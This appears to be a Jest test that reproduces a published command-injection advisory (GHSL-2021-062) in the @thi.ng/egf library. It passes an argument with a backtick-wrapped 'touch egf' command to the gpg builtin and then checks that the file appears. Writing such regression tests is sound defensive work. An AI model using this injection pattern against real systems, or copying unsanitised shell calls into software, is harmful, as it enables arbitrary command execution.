//https://securitylab.github.com/advisories/GHSL-2021-062-thi-ng-egf-cmd-injection/
test("Command Injection in @thi.ng/egf", () => {
  const egf = require("@thi.ng/egf");
  const fs = require("fs");
  const path = "./egf";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    egf.BUILTINS.gpg("foo", "bar`touch egf`", { opts: { decrypt: true } });
  } catch (error) {}
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
